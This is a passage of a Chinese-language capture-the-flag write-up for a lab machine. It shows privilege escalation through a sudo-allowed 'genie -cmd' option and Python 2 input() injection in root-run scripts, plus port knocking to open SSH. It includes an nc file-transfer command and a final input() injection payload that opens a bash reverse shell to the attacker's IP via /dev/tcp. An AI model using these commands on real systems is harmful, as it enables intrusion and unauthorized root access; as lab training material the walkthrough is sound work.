+<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie
+sudo -u sam /usr/bin/genie
+usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+genie: error: the following arguments are required: wish
+</code></pre>
+<p>得到了一些参数信息，<code>man</code> 一下看看指令手册：</p>
+<pre><code class="language-bash">nitish@box7:/opt/80$ man /usr/bin/genie | cat
+man /usr/bin/genie | cat
+
+man(8)                          genie man page                          man(8)
+
+NAME
+       genie - Make a wish
+
+SYNOPSIS
+       genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+
+DESCRIPTION
+       genie would complete all your wishes, even the naughty ones.
+
+       We  all  dream  of getting those crazy privelege escalations, this will                                                                             
+       even help you acheive that.                                                                                                                         
+
+OPTIONS
+       wish
+
+              This is the wish you want to make .
+
+       -g, --god
+
+              Sometime we all would like to make a wish to  god,  this  option
+              let you make wish directly to God;
+
+              Though  genie can't gurantee you that your wish will be heard by
+              God, he's a busy man you know;
+
+       -p, --shell
+
+              Well who doesn't love those. You can get shell. Ex: -p &quot;/bin/sh&quot;
+
+       -e, --exec
+
+              Execute command on someone else computer is just too  damn  fun,
+              but this comes with some restrictions.
+
+       -cmd
+
+              You know sometime all you new is a damn CMD, windows I love you.
+
+SEE ALSO
+       mzfr.github.io
+
+BUGS
+       There  are  shit  loads  of bug in this program, it's all about finding
+       one.
+
+AUTHOR
+       mzfr
+
+1.0                            11 November 2019                         man(8)
+</code></pre>
+<p>写得有点抽象，不过我们得到了 <code>-cmd</code> 这个重要参数</p>
+<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd
+sudo -u sam /usr/bin/genie -cmd
+usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+genie: error: the following arguments are required: wish
+nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd wish
+sudo -u sam /usr/bin/genie -cmd wish
+Pass your wish to GOD, he might be able to help you.
+nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd whoami
+sudo -u sam /usr/bin/genie -cmd whoami
+my man!!
+$ whoami
+whoami
+sam
+</code></pre>
+<p>于是成功获得了 sam 用户身份及其权限。继续查看其权限：</p>
+<pre><code class="language-bash">$ sudo -l
+sudo -l
+Matching Defaults entries for sam on box7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sam may run the following commands on box7:
+    (root) NOPASSWD: /root/lago
+</code></pre>
+<p>发现其可以无条件以 root 用户执行 <code>/root/lago</code>，执行之：</p>
+<pre><code class="language-bash">$ sudo /root/lago
+sudo /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:
+</code></pre>
+<p>四个选项都可以尝试一下，结果是都在逗你玩。</p>
+<p>我们继续探索 sam 用户相关的东西：</p>
+<pre><code class="language-bash">$ cd ~
+cd ~
+$ cd /home/sam
+cd /home/sam
+$ ls -la
+ls -la
+total 36
+drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
+drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
+-rw------- 1 root root  417 Nov 14  2019 .bash_history
+-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
+-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
+drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
+drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
+-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
+-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
+-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
+</code></pre>
+<p>发现用户目录下有一个 <code>.pyc</code> 文件，启动一个新终端监听：</p>
+<pre><code class="language-bash">└─$ nc -nvlp 4444 &gt; 1.pyc
+listening on [any] 4444 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 58560
+</code></pre>
+<p>在旧终端中传输：</p>
+<pre><code class="language-bash">$ nc -w 4 10.0.2.4 4444 &lt;.pyc
+nc -w 4 10.0.2.4 4444 &lt;.pyc
+</code></pre>
+<p>然后我们在新终端中反编译这个 <code>.pyc</code> 文件</p>
+<pre><code class="language-python">└─$ ./pycdc /home/kali/Downloads/1.pyc                                                                                                                     
+# Source Generated with Decompyle++
+# File: 1.pyc (Python 2.7)
+
+from getpass import getuser
+from os import system
+from random import randint
+
+def naughtyboi():
+    print 'Working on it!! '
+
+
+def guessit():
+    num = randint(1, 101)
+    print 'Choose a number between 1 to 100: '
+    s = input('Enter your number: ')
+    if s == num:
+        system('/bin/sh')
+    else:
+        print 'Better Luck next time'
+
+
+def readfiles():
+    user = getuser()
+    path = input('Enter the full of the file to read: ')
+    print 'User %s is not allowed to read %s' % (user, path)
+
+
+def options():
+    print 'What do you want to do ?'
+    print '1 - Be naughty'
+    print '2 - Guess the number'
+    print '3 - Read some damn files'
+    print '4 - Work'
+    choice = int(input('Enter your choice: '))
+    return choice
+
+
+def main(op):
+    if op == 1:
+        naughtyboi()
+    elif op == 2:
+        guessit()
+    elif op == 3:
+        readfiles()
+    elif op == 4:
+        print 'work your ass off!!'
+    else:
+        print 'Do something better with your life'
+
+if __name__ == '__main__':
+    main(options())
+</code></pre>
+<p>我们发现选项 2 对应的 <code>guessit()</code> 函数中使用了 <code>input()</code> 函数，其存在注入漏洞：</p>
+<pre><code class="language-python">def guessit():
+    num = randint(1, 101)
+    print 'Choose a number between 1 to 100: '
+    s = input('Enter your number: ')
+    if s == num:
+        system('/bin/sh')
+    else:
+        print 'Better Luck next time'
+</code></pre>
+<p>我们只需输入 <code>num</code>，这条赋值语句就会变为 <code>s=num</code>，那么接下来 <code>s == num</code> 自然成立：</p>
+<pre><code class="language-bash">$ sudo /root/lago
+sudo /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:2
+2
+Choose a number between 1 to 100: 
+Enter your number: num
+num
+# whoami
+whoami
+root
+# 
+</code></pre>
+<p>成功获取 root 权限，接下来改密码：</p>
+<p><img alt="8-5" src="../8-5.png" /></p>
+<h2 id="_1">附加题</h2>
+<p>我们现在已获得了 root 权限，接下来继续探索。</p>
+<h3 id="1337-telnet">一、1337 端口用 telnet 访问服务存在漏洞，试寻找之</h3>
+<pre><code class="language-bash">└─$ telnet 10.0.2.10 1337
+Trying 10.0.2.10...
+Connected to 10.0.2.10.
+Escape character is '^]'.
+  ____                        _____ _                
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(4, '-', 6)
+&gt; 
+
+</code></pre>
+<p>我们利用 root 权限查询管理其服务：</p>
+<pre><code class="language-bash"># netstat -anp | grep 1337
+netstat -anp | grep 1337
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      750/xinetd 
+</code></pre>
+<p>发现其使用 xinetd 这一服务，继续查询之：</p>
+<pre><code class="language-bash"># cd /etc/xinetd.d
+cd /etc/xinetd.d
+# ls
+ls
+chargen      daytime      discard      echo      game     services  time-udp
+chargen-udp  daytime-udp  discard-udp  echo-udp  servers  time
+# cat game
+cat game
+service game
+
+{
+
+  disable = no
+
+  socket_type = stream
+
+  protocol = tcp
+
+  wait = no
+
+  user = root
+
+  type = UNLISTED
+
+  bind = 0.0.0.0
+
+  port = 1337
+
+  server = /opt/1337/run_challenge.sh
+
+}
+</code></pre>
+<p>从列表中得到 <code>server</code> 的目录，查看之：</p>
+<pre><code class="language-bash">cat /opt/1337/run_challenge.sh
+#! /bin/bash
+
+python -u /opt/1337/app.py
+
+
+# 
+</code></pre>
+<p>得到一个 <code>python</code> 文件的目录，查看之：</p>
+<pre><code class="language-python"># cat python -u /opt/1337/app.py
+cat python -u /opt/1337/app.py
+cat: python: No such file or directory
+#!/usr/bin/env python3
+
+import sys
+
+from random import choice, randint
+
+
+
+from pyfiglet import print_figlet
+
+
+
+
+
+def add(a,b): return a+b
+
+def div(a,b): return int(a/b)
+
+def multiply(a,b): return a*b
+
+def sub(a,b): return a-b
+
+
+
+print_figlet(&quot;Game Time&quot;)
+
+print(&quot;Let's see how good you are with simple maths&quot;)
+
+print(&quot;Answer my questions 1000 times and I'll give you your gift.&quot;)
+
+
+
+
+
+OPERATIONS = ['+', '-', &quot;/&quot;, &quot;*&quot;]
+
+
+
+def main():
+
+    for i in range(1001):
+
+        a = randint(1,9)
+
+        b = randint(1,9)
+
+        op = choice(OPERATIONS)
+
+
+
+        print(a,op,b)
+
+        if op == &quot;+&quot;:
+
+            val = add(a,b)
+
+        if op == &quot;-&quot;:
+
+            val = sub(a,b)
+
+        if op == &quot;/&quot;:
+
+            val = div(a,b)
+
+        if op == &quot;*&quot;:
+
+            val = multiply(a,b)
+
+
+
+        try:
+
+            In = int(input(&quot;&gt; &quot;))
+
+        except Exception:
+
+            print(&quot;Stop acting like a hacker for a damn minute!!&quot;)
+
+            sys.exit(1)
+
+
+
+        if In == val:
+
+            continue
+
+        else:
+
+            print(&quot;Wrong answer&quot;)
+
+            sys.exit(1)
+
+
+
+    with open(&quot;/opt/1337/p0rt5&quot;, 'r') as f:
+
+        print(f.read())
+
+
+
+if __name__ == &quot;__main__&quot;:
+
+    main()
+
+
+# 
+</code></pre>
+<p>这里仍然存在 <code>input()</code> 的注入漏洞，不过既然我们知道源代码了，可以直接查看代码中作为结果打开的文件：</p>
+<pre><code class="language-bash"># cat /opt/1337/p0rt5
+cat /opt/1337/p0rt5
+Here is your gift, I hope you know what to do with it:
+
+1356, 6784, 3409
+</code></pre>
+<p>得到了三个数字。</p>
+<p>这三个数字有很多方法得到：</p>
+<ol>
+<li>正规方法，真的回答一千次，或使用脚本回答，得到。</li>
+<li>注入之，输入一千次或使用脚本输入一千次 <code>val</code> 得到。</li>
+<li>查看源代码直接打开目录得到。</li>
+</ol>
+<h3 id="_2">二、三个数字的用处</h3>
+<p>这三个数字其实是用于打开 filtered 的 22 号端口：</p>
+<pre><code class="language-bash">└─$ sudo nmap -p- 10.0.2.10
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:32 EST
+Nmap scan report for 10.0.2.10
+Host is up (0.00015s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE    SERVICE
+21/tcp   open     ftp
+22/tcp   filtered ssh
+1337/tcp open     waste
+7331/tcp open     swx
+MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.25 second
+</code></pre>
+<p>使用如下命令，对端口进行敲门：</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ knock 10.0.2.10 1356 6784 3409
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p- 10.0.2.10                                                                                                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:34 EST
+Nmap scan report for 10.0.2.10
+Host is up (0.00044s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+1337/tcp open  waste
+7331/tcp open  swx
+MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
+</code></pre>
+<p>也就是打开了 22 号端口，从而我们可以使用 ssh 服务了。</p>
+<p>这点最直接的用处是可以直接远程登陆 nitish 用户，而不必再使用反弹 shell：</p>
+<pre><code class="language-bash">└─$ ssh nitish@10.0.2.10
+The authenticity of host '10.0.2.10 (10.0.2.10)' can't be established.
+ED25519 key fingerprint is SHA256:hDngTQnjVXoBeWuPEH3si0MbCre9a/g2G4N6/pRZLFk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.10' (ED25519) to the list of known hosts.
+nitish@10.0.2.10's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Nov 30 13:05:28 IST 2025
+
+  System load:  0.0               Processes:           118
+  Usage of /:   37.6% of 9.78GB   Users logged in:     1
+  Memory usage: 21%               IP address for eth0: 10.0.2.10
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+329 packages can be updated.
+266 updates are security updates.
+
+New release '20.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Thu Nov 14 20:32:20 2019 from 192.168.1.107
+nitish@box7:~$ 
+</code></pre>
+<h3 id="_3">三、对第一个问题的另一个回答</h3>
+<p>我们之前提到第一个问题的漏洞在于注入漏洞，可以直接输入一千遍 <code>val</code> 得到神秘的三个数字，但是这个注入漏洞还可以起到别的作用。</p>
+<p>注意 game 服务的执行者是 root，我们于是就可以直接通过注入漏洞 + 反弹 shell 窃取其权限：</p>
+<pre><code class="language-bash">└─$ telnet 10.0.2.10 1337                                                                                                                                  
+Trying 10.0.2.10...
+Connected to 10.0.2.10.
+Escape character is '^]'.
+  ____                        _____ _                
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(1, '*', 2)
+&gt; __import__('os').system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1&quot;')
+</code></pre>
+<p>窃取 root 权限成功！</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": [], "search": "../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+        <script src="../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
